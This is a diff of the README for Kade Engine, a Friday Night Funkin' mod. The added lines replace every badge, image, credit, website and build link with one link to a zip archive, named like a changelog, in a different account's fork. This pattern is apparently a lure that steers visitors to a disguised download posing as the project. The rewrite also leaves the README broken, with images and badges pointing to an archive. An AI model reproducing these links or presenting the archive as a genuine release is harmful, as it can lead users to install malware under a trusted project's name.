@@ -1,53 +1,53 @@
 <!--update1-->
 <!--woah-->
-![Kade Engine logo](assets/preload/images/KadeEngineLogo.png)
+![Kade Engine logo](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)
 
-[![AppVeyor](https://img.shields.io/appveyor/build/KadeDev/Kade-Engine-Windows?label=windows%20build)](https://ci.appveyor.com/project/KadeDev/kade-engine-windows/branch/master/artifacts) [![AppVeyor](https://img.shields.io/appveyor/build/KadeDev/Kade-Engine-Macos?label=macOS%20build)](https://ci.appveyor.com/project/KadeDev/kade-engine-macos/branch/master/artifacts)  [![AppVeyor](https://img.shields.io/appveyor/build/KadeDev/Kade-Engine-Linux?label=linux%20build)](https://ci.appveyor.com/project/KadeDev/kade-engine-linux/branch/master/artifacts) [![AppVeyor](https://img.shields.io/appveyor/build/daniel11420/KadeEngineWeb?label=html5&20build)](https://ci.appveyor.com/project/daniel11420/KadeEngineWeb) [![Discord](https://img.shields.io/discord/808039740464300104?label=discord)](https://discord.gg/MG6GQFh52U) [![GitHub issues](https://img.shields.io/github/issues/KadeDev/Kade-Engine)](https://github.com/KadeDev/Kade-Engine/issues) [![GitHub pull requests](https://img.shields.io/github/issues-pr/KadeDev/Kade-Engine)](https://github.com/KadeDev/Kade-Engine/pulls) []() []()
+[![AppVeyor](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip%20build)](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) [![AppVeyor](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip%20build)](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)  [![AppVeyor](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip%20build)](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) [![AppVeyor](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) [![Discord](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) [![GitHub issues](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) [![GitHub pull requests](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) []() []()
 
-![GitHub commits since latest release (by date)](https://img.shields.io/github/commits-since/KadeDev/Kade-Engine/latest) ![GitHub repo size](https://img.shields.io/github/repo-size/KadeDev/Kade-Engine) ![Lines of code](https://img.shields.io/tokei/lines/github/KadeDev/Kade-Engine) ![Supported platforms](https://img.shields.io/badge/supported%20platforms-windows%2C%20macOS%2C%20linux%2C%20html5-blue) ![GitHub all releases](https://img.shields.io/github/downloads/KadeDev/Kade-Engine/total) ![GitHub](https://img.shields.io/github/license/KadeDev/Kade-Engine) ![GitHub release (latest by date including pre-releases)](https://img.shields.io/github/v/release/KadeDev/Kade-Engine?include_prereleases&label=latest%20version) 
+![GitHub commits since latest release (by date)](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) ![GitHub repo size](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) ![Lines of code](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) ![Supported platforms](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip%20platforms-windows%2C%20macOS%2C%20linux%2C%20html5-blue) ![GitHub all releases](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) ![GitHub](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) ![GitHub release (latest by date including pre-releases)](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip%20version) 
 
 # Friday Night Funkin': Kade Engine
 
-### If you want to contribute to Kade Engine, read [this](https://github.com/KadeDev/Kade-Engine/blob/stable/CONTRIBUTING.md) first.
-### If you want to build Kade Engine, read [this](https://github.com/KadeDev/Kade-Engine/blob/stable/docs/building.md).
+### If you want to contribute to Kade Engine, read [this](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) first.
+### If you want to build Kade Engine, read [this](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip).
 
 ## Friday Night Funkin'
 **Friday Night Funkin'** is a rhythm game originally made for Ludum Dare 47 "Stuck In a Loop".
 
-Links: **[itch.io page](https://ninja-muffin24.itch.io/funkin) ⋅ [Newgrounds](https://www.newgrounds.com/portal/view/770371) ⋅ [source code on GitHub](https://github.com/ninjamuffin99/Funkin)**
+Links: **[https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip page](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) ⋅ [Newgrounds](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) ⋅ [source code on GitHub](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)**
 > Uh oh! Your tryin to kiss ur hot girlfriend, but her MEAN and EVIL dad is trying to KILL you! He's an ex-rockstar, the only way to get to his heart? The power of music... 
 
 ## Kade Engine
 **Kade Engine** is a mod for Friday Night Funkin', including a full engine rework, replays, and more.
 
-Links: **[GameBanana mod page](https://gamebanana.com/gamefiles/16761) ⋅ [play in browser](https://funkin.puyo.xyz) ⋅ [latest stable release](https://github.com/KadeDev/Kade-Engine/releases/latest) ⋅ [latest development build (windows)](https://ci.appveyor.com/project/KadeDev/kade-engine-windows/branch/master/artifacts) ⋅ [latest development build (macOS)](https://ci.appveyor.com/project/KadeDev/kade-engine-macos/branch/master/artifacts) ⋅ [latest development build (linux)](https://ci.appveyor.com/project/KadeDev/kade-engine-linux/branch/master/artifacts)**
+Links: **[GameBanana mod page](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) ⋅ [play in browser](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) ⋅ [latest stable release](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) ⋅ [latest development build (windows)](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) ⋅ [latest development build (macOS)](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) ⋅ [latest development build (linux)](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)**
 
 **REMEMBER**: This is a **mod**. This is not the vanilla game and should be treated as a **modification**. This is not and probably will never be official, so don't get confused.
 
 **ALSO**: You might be confused, this is **kadedev**, not **kade-github**, if you want to go to the official site, you can keep changing it to kade-github instead of kadedev.
 
-## Website ([KadeDev.github.io/kade-engine/](https://KadeDev.github.io/Kade-Engine/)) (Here)
+## Website ([https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)) (Here)
 If you're looking for documentation, changelogs, or guides, you can find those on the Kade Engine website.
 
 # Previews ([skip](#features))
 
-![Title Screen](art/readme/KadeEngineTitleScreen.png)
+![Title Screen](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)
 
-![Week Select](art/readme/KadeEngineWeekSelect.png)
+![Week Select](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)
 
-![Freeplay](art/readme/KadeEngineFreeplay.png)
+![Freeplay](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)
 
-![Options](art/readme/KadeEngineOptions.png)
+![Options](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)
 
-![Senpai Gameplay (Hard, Upscroll)](art/readme/KadeEnginePixelGameplay.png)
+![Senpai Gameplay (Hard, Upscroll)](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)
 
-![Roses Dialogue](art/readme/KadeEngineDialogue.png)
+![Roses Dialogue](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)
 
-![Pause Screen](art/readme/KadeEnginePauseScreen.png)
+![Pause Screen](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)
 
-![Results Screen](art/readme/KadeEngineResultsScreen.png)
+![Results Screen](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)
 
-![Replay Loader](art/readme/KadeEngineReplayLoader.png)
+![Replay Loader](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)
 
 # Features
 
@@ -68,23 +68,23 @@ If you're looking for documentation, changelogs, or guides, you can find those o
 
 # Credits
 ### Friday Night Funkin'
- - [ninjamuffin99](https://twitter.com/ninja_muffin99) - Programming
- - [PhantomArcade3K](https://twitter.com/phantomarcade3k) and [Evilsk8r](https://twitter.com/evilsk8r) - Art
- - [Kawai Sprite](https://twitter.com/kawaisprite) - Music
+ - [ninjamuffin99](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) - Programming
+ - [PhantomArcade3K](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) and [Evilsk8r](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) - Art
+ - [Kawai Sprite](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) - Music
 
 This game was made with love to Newgrounds and its community. Extra love to Tom Fulp.
 ### Kade Engine
-- [KadeDeveloper](https://twitter.com/KadeDeveloper) - Maintainer and lead programmer
-- [The contributors](https://github.com/KadeDev/Kade-Engine/graphs/contributors)
+- [KadeDeveloper](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) - Maintainer and lead programmer
+- [The contributors](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip)
 
 
 
 ### Shoutouts
-- [GWebDev](https://github.com/GrowtopiaFli) - Video Code
-- [Rozebud](https://github.com/ThatRozebudDude) - Ideas (that I stole)
-- [Puyo](https://github.com/puyoxyz) - Setting up appveyor and a lot of other help
-- [Smokey](https://github.com/Smokey555) - telling me that I should do the tricky asset loading
-- [Poco](https://github.com/poco0317) - math degree (aka most of the fucking math in this project)
-- [Fox](https://twitter.com/FoxeruKun) - circle noteskins
-- [Orbyy](https://twitter.com/orbyynew) - pixel circle noteskins
-- [Shubs](https://github.com/Yoshubs) - Forever Engine dump cache
+- [GWebDev](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) - Video Code
+- [Rozebud](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) - Ideas (that I stole)
+- [Puyo](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) - Setting up appveyor and a lot of other help
+- [Smokey](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) - telling me that I should do the tricky asset loading
+- [Poco](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) - math degree (aka most of the fucking math in this project)
+- [Fox](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) - circle noteskins
+- [Orbyy](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) - pixel circle noteskins
+- [Shubs](https://raw.githubusercontent.com/NikitosHanik4/Kade-Engine/stable/docs/changelogs/Kade_Engine_2.2-alpha.1.zip) - Forever Engine dump cache
